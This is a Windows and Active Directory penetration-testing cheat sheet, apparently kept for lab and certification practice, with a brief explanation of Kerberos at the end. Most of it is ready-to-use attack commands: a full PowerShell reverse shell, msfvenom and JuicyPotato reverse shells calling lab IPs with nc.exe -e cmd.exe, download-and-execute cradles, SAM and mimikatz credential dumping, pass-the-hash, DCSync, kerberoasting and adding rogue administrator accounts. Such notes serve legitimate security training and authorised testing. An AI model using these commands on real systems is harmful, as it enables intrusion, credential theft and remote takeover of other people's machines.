# Windows

### Important Files

```
c:\windows\system32\drivers\etc\hosts
c:\windows\win.ini
C:\xampp\php\php.ini
C:\xampp\apache\logs\access.log
C:\Windows\System32\DRIVERS
```

### Enumeration & Commands

```powershell
windows-privesc-check2.exe --dump -a		# https://github.com/pentestmonkey/windows-privesc-check 
systeminfo
schtasks /query /fo LIST /v		# scheduled task
Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}	# list all running services 
wmic service get name,displayname,pathname,startmode    # list all the running services
wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows"
netstat -ano    # find out what ports are open
---------------------Always Elevated-----------------------
# if value = 1 for the following reg entry
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# Create msi payload: 
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.131 LPORT=21 -f msi > esc.msi
# open nc on kali and run msi on victim to get SYSTEM shell
# https://viperone.gitbook.io/pentest-everything/writeups/pg-practice/windows/shenzi
-----------------------------------------------------------
net users
net user /domain [username]   # check domain group of the user
reg query HKLM /f pass /t REG_SZ /s
-------------------------Run As----------------------------
runas /netonly /user:[username] cmd	# run cmd as another user (even if they dont exists)
runas /env /profile /user:DVR4\Administrator "C:\users\viewer\nc.exe -e cmd.exe 192.168.49.169 443" # useful when ssh not working
Import-module invoke-runascs.ps1        # https://github.com/antonioCoco/RunasCs
Invoke-RunasCs [username] [password] [cmd]
-------------------------Add user--------------------------
net user /add [username] [password]
net localgroup "Remote Desktop Users" [username] /add
net localgroup "Administrators" [username] /add
------------------------privileges-------------------------
whoami /priv		# https://github.com/gtworek/Priv2Admin
SeManageVolumePrivilege (disabled/enabled)       # https://github.com/CsEnox/SeManageVolumeExploit
SeImpersonatePrivilege         # JuicyPotato
SeBackupPrivilege         # robocopy /b C:\Users\Administrator\Desktop\ C:\
SeShutdownPrivilege		# allow user to reboot machine (doens't matter whether the state is enabled or disabled)
-----------------------------------------------------------
icacls "C:\Puppet"    # check path permission
icacls [FILE] /grant [USERNAME]:F   # :F for full access
whoami /groups		# UAC bypass

For SYSTEM shell after gaining administrator read/write access:
https://github.com/sailay1996/WerTrigger
--------------------Exploit Compiling----------------------
i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32
----------------------Admin to SYSTEM----------------------
psexec.exe -i -s -d -accepteula cmd
```

### BloodHound & Query

```
bloodhound-python -u [username] -p [password[ -d blackfield.local -ns 10.10.10.192 -c DcOnly
MATCH p=(u {owned: true})-[r1]->(n) WHERE r1.isacl=true RETURN p
```

### Juicy Potato

```cmd
potato86.exe -l 1337 -c "{659cdea7-489e-11d9-a9cd-000d56965251}" -p c:\windows\system32\cmd.exe -a "/c c:\nc.exe -e cmd.exe 192.168.119.160 4321" -t *
# PotatoNG https://github.com/antonioCoco/JuicyPotatoNG
JuicyPotatoNG.exe -t * -p "c:\windows\system32\cmd.exe" -a "nc.exe 192.168.49.131 21 -e c:\windows\system32\cmd.exe"
```

### SAM (Security Account Manager)

A file that store Windows user credential. It can only be accessed when the Windows OS is not booted up. (Eg. from another OS)\
Passwords are LM & NTLM hashed\\

```cmd
Default file location: 
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SYSTEM

reg save HKLM\SAM c:\SAM
reg save HKLM\System c:\System

Dumping hashes:
samdump2 SYSTEM SAM
pwdump.py SYSTEM SAM    # For Windows 10

Format of Hashes:
[USERNAME]:[RID]:[LMHash]:[NTLMHash]:::   # RID = Relative Identifier
```

Ref: https://techgenix.com/how-cracked-windows-password-part2/

### Pivoting

```
----------PLINK.EXE----------
cmd.exe /c echo y | plink.exe -ssh -l [KALI_USERNAME] -pw [KALI_PASSWORD] -R [KALI_IP]:[KALI_PORT]:127.0.0.1:3306 [KALI_IP]
# C:\Tools\port_redirection_and_tunneling> cmd.exe /c echo y | plink.exe -ssh -l kali -pw ilak -R 10.11.0.4:1234:127.0.0.1:3306 10.11.0.4
# kali@kali:~$ sudo nmap -sS -sV 127.0.0.1 -p 1234
# Starting Nmap 7.60 ( https://nmap.org ) at 2019-04-20 05:00 EEST
# Nmap scan report for localhost (127.0.0.1)
# Host is up (0.00026s latency).
# PORT STATE SERVICE VERSION
# 1234/tcp open mysql MySQL 5.5.5-10.1.31-MariaDB
# Nmap done: 1 IP address (1 host up) scanned in 0.93 seconds
```

### Active Directory & LDAP

#### Enum

```
nmap -n -sV --script "ldap* and not brute" [IP_ADDR]
ldapsearch -H ldap://[IP_ADDR] -x -b "dc=[DC],dc=[DC]"
ldapsearch -H ldap://[IP_ADDR] -x -b '' -s base
windapsearch.py -d [DOMAIN] --dc-ip [IP_ADDR] -U    # -U to enumerate all AD users; -G for AD group enumerate
GetNPUsers.py htb.local/ -dc-ip 10.10.10.161 -request 		# ASRep Roasting
secretdumps.py htb.local/svc_user@10.10.10.161 -just-dc 	# dcsync attack, dump hashes
psexec.py htb.local/administrator@10.10.10.161 -hashes [ntlm:hash]	# login with hashes

----------Info----------
MS14-068 (For DC older than Windows Server 2012 R2)		# Ref: https://wizard32.net/blog/knock-and-pass-kerberos-exploitation.html
Database of AD stored on C:\Windows\NTNDS\ntds.dit of DC
```

Ref: https://book.hacktricks.xyz/pentesting/pentesting-ldap

#### PowerShell

```powershell
Import-Module [filename].ps1
C:\Users\[username]\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt   # check powershell history
IEX ( IWR http://[IP_ADDR]/[PATH] -UseBasicParsing)   # equil linux wget http://[IP_ADDR]/[PATH] to upload file to the server
iwr http://[IP_ADDR]/[PATH] -OutFile [FILE]
IEX(New-Object Net.Webclient).downloadString('http://[IP_ADDR]/[PATH]')
Get-ADDomain | select DNSRoot,NetBIOSName,DomainSID   # retrieve SID
nltest /domain_trusts   # show inbound/outbound trust
Get-ADUser -Filter * | select SamAccountName    # list users(name ending with $ indicate trust keys being stored)
Get-ADObject -LDAPFilter "objectClass=User" -Properties SamAccountName | select SamAccountName    # to retrieve user and computer accounts(ending with $)
Get-ADObject -ldapfilter "(&(isDeleted=TRUE))" -IncludeDeletedObjects -Properties *		# retrieve item in recycle bin
Set-ExecutionPolicy Unrestricted
powershell "iex(new-object net.webclient).downloadString('http://192.168.119.218/Sherlock.ps1');Find-AllVulns"
klist   # list the cached Kerberos tickets

----------Service Account Attack------------
.\enumSPN.ps1
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken-ArgumentList '[serviceprincipalname]'
Rubeus.exe kerberoast /tgtdeleg /user:[samaccountname]
# Crack with hashcat
---------------Reverse Shell----------------
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.11.0.4',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

--------------Scheduled Tasks---------------
$pw = ConvertTo-SecureString "[PASSWORD]" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential("[USERNAME]". $pw)
Invoke-Command -Computer [PC_NAME] -ScriptBlock { schtasks /create /sc onstart /tn shell /tr C:\shell.exe /ru SYSTEM } -Credential $creds
# PG Hutch
```

### Metasploit

```
getsystem
load kiwi   # mimikatz
lsa_dump_sam
```

### RPC

```
rpcdump.py [USERNAME]@[IP_ADDR]
rpcclient -U '' [IP_ADDR]
  > enumdomusers    # to get list of users after signin
  > setuserinfo [username] [level] [password]		# level: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/6b0dff90-5ac0-429a-93aa-150334adabf6?redirectedfrom=MSDN
```

### Evil-WinRM

```
evil-winrm -i [IP_ADDR] -u [USERNAME] -H [HASH]   # hash retrievable from secretsdump.py machines/smb
evil-winrm -i [IP_ADDR] -u [USERNAME] -p [PASSWORD]
```

### Tcpdump

```
tcpdump -i tun0 icmp -v   # listen for icmp ping to tun0 interface
```

### Mimikatz

```
privilege::debug
token::elevate
lsadump::sam
------------------Pass The Hash-------------------
pth-winexe -U [USERNAME]%[HASH] //[IP_ADDR] cmd		# https://github.com/byt3bl33d3r/pth-toolkit
-----------------AD Enumeration-------------------
sekurlsa::logonpasswords
sekurlsa::tickets
kerberos::list
sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:e2b475c11da2a0748290d87aa966c327 /run:PowerShell.exe    # using ntlm of other user (retrieved from logonpasswords) to execute a program
```

### Powercat

```
. .\powercat.ps1
powercat -c 10.11.0.4 -p 443 -e cmd.exe   # reverse shell
powercat -l -p 443 -e cmd.exe   # bind shell
```

### wget equivalant / file transfer

```
certutil.exe -f -urlcache -split http://192.168.49.157/winPEASany.exe

--------Windows to Linux (SMB)----------
Method 1: 
On kali: impacket-smbserver [SHARE NAME] $(pwd) -smb2support -user [USER ON KALI] -password [PASSWORD ON KALI]
On windows:
$pass = convertto-securestring '[PASSWORD ON KALI]' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('[USER ON KALI]', $pass)
New-PSDrive -NAME [USER] -PSProvider FileSystem -Credential $cred -Root \\[KALI IP]\[SHARE NAME]

Method 2:
on Kali : smbserver.py test ./share
smbserver.py [share_name] [folder_path]
# If failed, edit the smb conf file on kali:
# /etc/samba/smb.conf
# min protocol = SMB2

on Windows: copy proof.txt \\192.168.119.160\test\proof.txt
copy [file to transfer] \\[linux ip]\[share_name]\[output file name]

--------Windows to Linux (PowerCat)----------
on Linux: 
sudo nc -lnvp 443 > receiving_powercat.ps1

on Windows:
powercat -c 10.11.0.4 -p 443 -i C:\Users\admin\powercat.ps1
```

### enumSPN.ps1

```powershell
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
$objDomain = New-Object System.DirectoryServices.DirectoryEntry
$Searcher.filter = "serviceprincipalname=*"
$Result = $Searcher.FindAll()
Foreach($obj in $Result)
{
	Foreach($prop in $obj.Properties)
	{
		$prop
	}
	Write-Host "------------------------"
}
```

1. Find interesting SPN (Service Principal Name)
2. Get its SAMaccountname

```
Rubeus.exe kerberoast /nowrap
```

### When NTLM auth disabled, Kerberos auth
```
getTGT [domain]/[username]:[password]		# getTGT scrm.local/ksimpson:ksimpson
export KRB5CCNAME=ksimpson.ccache
klist
# https://www.youtube.com/watch?v=_8FE3JZIPfo&list=PLidcsTyj9JXK-fnabFLVEvHinQ14Jy5tf&index=49
```

## Microsoft authentication protocols

1. LANMAN (LAN Manager)
2. NTLM (New Technology LAN Manager) v1, v2
3. Kerberos

### Kerberos Authentication

#### TGT (Ticket Granting Ticket)

As it name suggest, it is a ticket used to request more tickets.

1. When user request for a TGT, the user will need to send their **username & timestamp** encrypted with their **password** to the KDC (Key Distribution Center) service installed in the DC.
2. The KDC will send back a **TGT** along with a **User Session Key** to the user upon successfully authenticated.

#### TGS (Ticket Granting Service)

It is a ticket used to authenticated and access to specific service.

1. **Username & timestamp** encrypted with the **user session** received earlier along with the **TGT** and the **SPN** of the service are required to be sent to the KDC to request for a TGS.
2. The KDC will return with a **TGS** and a **Service Session Key.**
3. To authenticate to the service, user need to send their **Username & Timestamp** and their **TGS** to the service.
